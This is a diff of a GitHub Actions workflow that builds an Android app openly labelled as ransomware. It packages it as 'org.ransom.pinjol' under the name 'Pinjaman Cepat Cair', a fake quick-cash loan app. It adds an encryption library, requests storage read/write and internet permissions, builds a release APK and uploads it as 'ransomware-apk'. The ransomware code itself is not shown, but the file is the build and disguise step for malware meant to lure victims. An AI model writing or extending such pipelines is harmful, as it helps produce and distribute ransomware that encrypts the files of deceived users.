@@ -1,34 +1,93 @@
-name: Build APK
+name: Build Ransomware APK
 
 on:
-  workflow_dispatch:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:  # Bisa dijalankan manual
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      
-      - name: Build with Docker
-        run: |
-          # Pull image yang sudah lengkap dengan SDK
-          docker pull androidsdk/android-30:latest
-          
-          # Run build di dalam container
-          docker run --rm \
-            -v $PWD:/workspace \
-            -w /workspace \
-            androidsdk/android-30:latest \
-            /bin/bash -c "
-              apt update && \
-              apt install -y python3-pip git && \
-              pip3 install buildozer cython virtualenv && \
-              export ANDROID_HOME=/android-sdk && \
-              buildozer android debug
-            "
-      
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
         with:
-          name: RNSMV2-APK
-          path: bin/*.apk
+          python-version: '3.9'
+
+      - name: Install system dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y \
+            python3-pip \
+            openjdk-17-jdk \
+            git \
+            zip \
+            unzip \
+            autoconf \
+            libtool \
+            pkg-config \
+            zlib1g-dev \
+            libncurses5-dev \
+            libncursesw5-dev \
+            libtinfo5 \
+            cmake \
+            libffi-dev \
+            libssl-dev
+
+      - name: Install Python dependencies
+        run: |
+          pip install --upgrade pip
+          pip install cython virtualenv
+          pip install buildozer python-for-android
+
+      - name: Setup Android SDK
+        run: |
+          mkdir -p $HOME/android-sdk
+          cd $HOME/android-sdk
+          wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
+          unzip -o commandlinetools-linux-9477386_latest.zip
+          mkdir -p cmdline-tools/latest
+          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
+          
+          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
+          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH
+          echo "$HOME/android-sdk/platform-tools" >> $GITHUB_PATH
+
+      - name: Accept Android licenses
+        run: |
+          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses
+
+      - name: Install SDK components
+        run: |
+          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
+
+      - name: Install pycryptodome for encryption
+        run: |
+          pip install pycryptodome
+
+      - name: Build APK with python-for-android
+        run: |
+          p4a apk \
+            --private . \
+            --package=org.ransom.pinjol \
+            --name="Pinjaman Cepat Cair" \
+            --version=1.0 \
+            --bootstrap=sdl2 \
+            --requirements=python3,kivy==2.1.0,requests,pycryptodome \
+            --permission INTERNET \
+            --permission READ_EXTERNAL_STORAGE \
+            --permission WRITE_EXTERNAL_STORAGE \
+            --arch=arm64-v8a \
+            --arch=armeabi-v7a \
+            --release
+
+      - name: Upload APK artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: ransomware-apk
+          path: ./*.apk
